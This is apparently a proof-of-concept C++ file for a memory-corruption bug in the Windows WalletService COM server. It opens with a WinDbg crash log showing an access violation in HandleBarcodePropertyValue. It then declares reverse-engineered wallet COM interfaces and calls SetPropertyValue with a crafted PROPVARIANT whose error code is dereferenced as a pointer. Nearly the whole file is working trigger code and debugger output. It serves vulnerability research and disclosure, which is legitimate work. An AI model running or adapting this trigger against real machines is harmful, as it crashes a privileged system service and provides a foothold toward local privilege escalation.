/*
(14f4.1d20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
walletservice!Wallet::WalletItem::HandleBarcodePropertyValue+0x121:
00007ffc`3fb5d401 6642391c42      cmp     word ptr [rdx+r8*2],bx ds:00000000`c0000001=????
0:009> kb
# RetAddr           : Args to Child                                                           : Call Site
00 00007ffc`3fb5cd54 : 00000000`000000cc 00000000`000000cc 00007ffc`44e7aea0 0000000a`9957dcd0 : walletservice!Wallet::WalletItem::HandleBarcodePropertyValue+0x121
01 00007ffc`3fb65073 : 00000169`ab1082b8 00000000`00000000 0000000a`9957d830 0000000a`9957dcd8 : walletservice!Wallet::WalletItem::SetPropertyValue+0xa4
02 00007ffc`44eb6a63 : 00000169`ab1081d0 00000000`000000cc 00000169`ab0488c0 00007ffc`44eb6a16 : walletservice!Wallet::WalletXItem::SetPropertyValue+0x53
03 00007ffc`44f1a036 : 00000169`ab04adc0 00007ffc`461e0e80 00000169`ab0f1b40 00007ffc`3fad9950 : RPCRT4!Invoke+0x73
04 00007ffc`44e783b9 : 00000169`ab044350 00000000`00000000 00000169`ab044350 00007ffc`4605812b : RPCRT4!Ndr64StubWorker+0xb56
05 00007ffc`46055cff : 00000000`00000000 0000000a`9957e140 00007ffc`3fad9950 00000169`ab050770 : RPCRT4!NdrStubCall3+0xc9
06 00007ffc`44e99bab : 00000000`00000001 00000169`ab04adc0 00000000`00000000 00000000`00000000 : combase!CStdStubBuffer_Invoke+0x5f [onecore\com\combase\ndr\ndrole\stub.cxx @ 1524]
07 00007ffc`4603d0e3 : 00000169`ab04adc0 00000169`ab0f1b40 00000000`00000000 0000a401`6bc75c8c : RPCRT4!CStdStubBuffer_Invoke+0x3b
08 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : combase!InvokeStubWithExceptionPolicyAndTracing::__l6::<lambda_c9f3956a20c9da92a64affc24fdd69ec>::operator()+0x18 [onecore\com\combase\dcomrem\channelb.cxx @ 1385]
09 00007ffc`4603ced3 : 00000000`ab04aa00 0000000a`9957e0c0 0000000a`9957e088 00000000`00000000 : combase!ObjectMethodExceptionHandlingAction<<lambda_c9f3956a20c9da92a64affc24fdd69ec> >+0x43 [onecore\com\combase\dcomrem\excepn.hxx @ 87]
0a (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : combase!InvokeStubWithExceptionPolicyAndTracing+0xa8 [onecore\com\combase\dcomrem\channelb.cxx @ 1383]
0b 00007ffc`46059556 : 00000000`00000000 00007ffc`44e9a315 00000169`ab050770 00000169`ab03a810 : combase!DefaultStubInvoke+0x1c3 [onecore\com\combase\dcomrem\channelb.cxx @ 1452]
0c (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : combase!SyncStubCall::Invoke+0x22 [onecore\com\combase\dcomrem\channelb.cxx @ 1509]
0d 00007ffc`4603a4fa : 00000169`ab04b700 0000000a`9957e2c0 00000169`00000002 0000000a`9957e800 : combase!SyncServerCall::StubInvoke+0x26 [onecore\com\combase\dcomrem\servercall.hpp @ 826]
0e (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : combase!StubInvoke+0x259 [onecore\com\combase\dcomrem\channelb.cxx @ 1734]
0f 00007ffc`460547ed : 00007ffc`4425a6f0 00000169`ab0f1ab0 00000169`ab0f1c20 00007ffc`46053ab1 : combase!ServerCall::ContextInvoke+0x42a [onecore\com\combase\dcomrem\ctxchnl.cxx @ 1418]
10 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : combase!CServerChannel::ContextInvoke+0x70 [onecore\com\combase\dcomrem\ctxchnl.cxx @ 1327]
11 00007ffc`45ff01ac : 00000169`ab0f1ab0 00000000`00000000 00000169`ab0f1b40 00000000`00000000 : combase!DefaultInvokeInApartment+0xad [onecore\com\combase\dcomrem\callctrl.cxx @ 3354]
12 00007ffc`45ff0a11 : 00000169`ab0f1ab0 00000169`ab0772d8 00000169`ab050770 00000000`d0908070 : combase!AppInvoke+0x1ec [onecore\com\combase\dcomrem\channelb.cxx @ 1182]
13 00007ffc`45ff21b8 : 00000000`00000000 0000000a`9957ea50 00000169`ab0f1ab0 00000169`ab030d90 : combase!ComInvokeWithLockAndIPID+0x681 [onecore\com\combase\dcomrem\channelb.cxx @ 2290]
14 00007ffc`44e949f8 : 00000169`aae308c0 00000000`00000000 00000000`00000000 00000169`ab03bd30 : combase!ThreadInvoke+0xf88 [onecore\com\combase\dcomrem\channelb.cxx @ 6941]
15 00007ffc`44e6c9b1 : 00000000`00000003 00500040`00000000 0000000a`9957ef60 00000040`0000003e : RPCRT4!DispatchToStubInCNoAvrf+0x18
16 00007ffc`44e6c500 : 00000169`ab08d8e0 00007ffc`44f2fca4 00000000`00000000 00000000`00000000 : RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x2d1
17 00007ffc`44e5a71f : 00000000`01080000 00000169`aae30280 00000000`00000000 00007ffc`463d8b7f : RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x160
18 00007ffc`44e59d7a : 00000000`00031831 00000000`00000002 00000000`00000000 00000169`ab04f190 : RPCRT4!LRPC_SCALL::DispatchRequest+0x16f
19 00007ffc`44e59361 : 00000000`00000002 00000169`00000000 00000169`00000000 00000000`00000000 : RPCRT4!LRPC_SCALL::HandleRequest+0x7fa
1a 00007ffc`44e58dce : 00000000`00000000 00000000`00000000 00000000`00000001 00000169`ab030840 : RPCRT4!LRPC_ADDRESS::HandleRequest+0x341
1b 00007ffc`44e56a05 : 00000000`00000002 00000169`ab03bd30 00000169`ab030948 0000000a`9957f5c8 : RPCRT4!LRPC_ADDRESS::ProcessIO+0x89e
1c 00007ffc`463d33ed : 00000000`00000000 00000000`00000000 00000169`ab04b3c0 00000000`00000000 : RPCRT4!LrpcIoComplete+0xc5
1d 00007ffc`463d4142 : 00000169`ab030a20 00000000`00000000 00000169`ab002340 00000000`00000000 : ntdll!TppAlpcpExecuteCallback+0x14d
1e 00007ffc`45a17c24 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!TppWorkerThread+0x462
1f 00007ffc`4640d4d1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
20 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21

*/
#include <windows.h>
#include <strsafe.h>
#include <inttypes.h>


class __declspec(uuid("21f1a452-9759-48a5-8d9b-bbd859ef89ee")) IWalletCustomProperty : public IUnknown {
public:
	virtual HRESULT __stdcall GetLabel(struct tagPROPVARIANT* p0);
	virtual HRESULT __stdcall SetLabel(struct tagPROPVARIANT* p0);
	virtual HRESULT __stdcall GetValue(struct tagPROPVARIANT* p0);
	virtual HRESULT __stdcall SetValue(struct tagPROPVARIANT* p0);
	virtual HRESULT __stdcall Proc7( /* ENUM32 */ uint32_t* p0);
	virtual HRESULT __stdcall Proc8( /* ENUM32 */ uint32_t p0);
	virtual HRESULT __stdcall GetGroup( /* ENUM32 */ uint32_t idx,  /* ENUM32 */ uint32_t* v1, uint32_t* v2);
	virtual HRESULT __stdcall SetGroup( /* ENUM32 */ uint32_t idx,  /* ENUM32 */ uint32_t v1, uint32_t v2);
};
class __declspec(uuid("16083582-9360-4758-8978-46970ae14999")) IWalletItem : public IUnknown {
public:
	virtual HRESULT __stdcall GetId(int64_t* p0);
	virtual HRESULT __stdcall HasPendingChanges(  /* ENUM32 */ uint32_t* p0, int64_t p1, int64_t* p2);
	virtual HRESULT __stdcall GetType( /* ENUM32 */ uint32_t* p0);
	virtual HRESULT __stdcall GetPropertyValue( /* ENUM32 */ uint32_t p0, PROPVARIANT* p1);
	virtual HRESULT __stdcall SetPropertyValue( /* ENUM32 */ uint32_t p0, PROPVARIANT* p1);
	virtual HRESULT __stdcall GetPropertyMaxSize( /* ENUM32 */ uint32_t p0, int64_t* p1);
	virtual HRESULT __stdcall HasPendingChange( /* ENUM32 */ uint32_t p0, int64_t* p1);
	virtual HRESULT __stdcall CreateCustomProperty(IWalletCustomProperty** p0);
	virtual HRESULT __stdcall Proc11(wchar_t* p0, IWalletCustomProperty** p1);
	virtual HRESULT __stdcall Proc12(wchar_t* p0, IWalletCustomProperty* p1);
	virtual HRESULT __stdcall Proc13(wchar_t* p0, struct Struct_97* p1, struct Struct_97* p2,  /* ENUM32 */ uint32_t* p3);
	virtual HRESULT __stdcall Proc14(wchar_t* p0, struct Struct_97* p1, struct Struct_97* p2,  /* ENUM32 */ uint32_t p3);
	virtual HRESULT __stdcall Proc15(VARIANT* p0);
	virtual HRESULT __stdcall Proc16( /* ENUM32 */ uint32_t p0, VARIANT* p1);
	virtual HRESULT __stdcall Proc17(int64_t* p0);
	virtual HRESULT __stdcall Proc18();
	virtual HRESULT __stdcall Proc19( /* ENUM32 */ uint32_t p0);
	virtual HRESULT __stdcall Proc20(IWalletItem* p0);
	virtual HRESULT __stdcall Proc21( /* ENUM32 */ uint32_t* p0);
	virtual HRESULT __stdcall Proc22(int64_t* p0);
};
class __declspec(uuid("14ff27de-1dc9-4617-8ed3-9a042d52391f")) IWalletItemList : public IUnknown {
public:
	virtual HRESULT __stdcall HasPendingChanges( /* ENUM32 */ uint32_t* p0);
	virtual HRESULT __stdcall GetItemCount(ULONG* p0);
	virtual HRESULT __stdcall GetItemAt(int64_t p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc6(int64_t p0);
	virtual HRESULT __stdcall Proc7(int64_t p0, int64_t* p1);
	virtual HRESULT __stdcall Proc8(int64_t p0, int64_t* p1);
	virtual HRESULT __stdcall Proc9(int64_t p0,  /* ENUM32 */ uint32_t* p1);
	virtual HRESULT __stdcall Proc10(IWalletItemList* p0);
};
class __declspec(uuid("fe8a7c3d-a504-4c31-81ec-d8ec8d9fa6b7")) IWalletTransactionManager : public IUnknown {
public:
	virtual HRESULT __stdcall Proc3(int64_t p0, IWalletItemList** p1);
	virtual HRESULT __stdcall Proc4(IWalletItem* p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc5(int64_t* p0);
	virtual HRESULT __stdcall Proc6(int64_t p0);
	virtual HRESULT __stdcall Proc7(int64_t p0);
};
class __declspec(uuid("c5b00653-be27-41f2-b669-d780698f8d9d")) IWalletLocationManager : public IUnknown {
public:
	virtual HRESULT __stdcall Proc3(int64_t p0, IWalletItemList** p1);
	virtual HRESULT __stdcall Proc4(IWalletItem* p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc5(int64_t* p0);
	virtual HRESULT __stdcall Proc6(int64_t p0);
	virtual HRESULT __stdcall Proc7(int64_t p0);
	virtual HRESULT __stdcall Proc8();
	virtual HRESULT __stdcall Proc9(int64_t* p0);
	virtual HRESULT __stdcall Proc10();
	virtual HRESULT __stdcall Proc11();
};
class __declspec(uuid("b9860518-0cdf-4dba-a981-807f3cbdc80a")) IWalletX : public IUnknown {
public:
	virtual HRESULT __stdcall Proc3(IWalletItemList** p0);
	virtual HRESULT __stdcall Proc4(IWalletItemList** p0);
	virtual HRESULT __stdcall Proc5(wchar_t* p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc6();
	virtual HRESULT __stdcall Proc7(IWalletTransactionManager** p0);
	virtual HRESULT __stdcall Proc8(IWalletLocationManager** p0);
	virtual HRESULT __stdcall Proc9(IWalletItem* p0,  /* ENUM32 */ uint32_t p1);
	virtual HRESULT __stdcall Proc10(int64_t p0, int64_t* p1);
	virtual HRESULT __stdcall CreateWalletItem( /* ENUM32 */ uint32_t p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc12(wchar_t* p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc13(int64_t p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc14(IWalletItem* p0);
	virtual HRESULT __stdcall Proc15(IWalletItem* p0, wchar_t* p1);
	virtual HRESULT __stdcall Proc16(IWalletItem* p0,  /* ENUM32 */ uint32_t* p1);
	virtual HRESULT __stdcall Proc17(IWalletItem* p0, int64_t p1);
	virtual HRESULT __stdcall Proc18(wchar_t* p0, IWalletItem** p1);
	virtual HRESULT __stdcall Proc19(wchar_t* p0);
};
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

int PrintError(unsigned int line, DWORD hr)
{
	wprintf_s(L"ERROR: Line:%d HRESULT: 0x%X\n", line, hr);
	return hr;
}

int wmain(int argc, wchar_t **argv) {
	
	IWalletX* obj;
	IWalletItem* obj1;
	HRESULT hr;
	CLSID clsid;
	IID iid;

	CoInitializeEx(NULL, COINIT_MULTITHREADED);
	CLSIDFromString(OLESTR("{97061DF1-33AA-4B30-9A92-647546D943F3}"), &clsid);
	IIDFromString(OLESTR("{b9860518-0cdf-4dba-a981-807f3cbdc80a}"), &iid);
	PROPVARIANT test1;
	test1.vt = 10;
	test1.scode = STATUS_UNSUCCESSFUL;
	PROPVARIANT test2;
	test2.vt = 10;
	test2.scode = STATUS_SUCCESS;

	hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (LPVOID*)&obj);
	if (FAILED(hr)) { PrintError(__LINE__, hr); }

	hr = obj->CreateWalletItem(1, &obj1);
	if (FAILED(hr)) { PrintError(__LINE__, hr); }

	hr = obj1->SetPropertyValue(204, &test1);
	if (FAILED(hr)) { PrintError(__LINE__, hr); }

	hr = obj1->GetPropertyValue(209, &test2);
	if (FAILED(hr)) { PrintError(__LINE__, hr); }
	return 0;
}
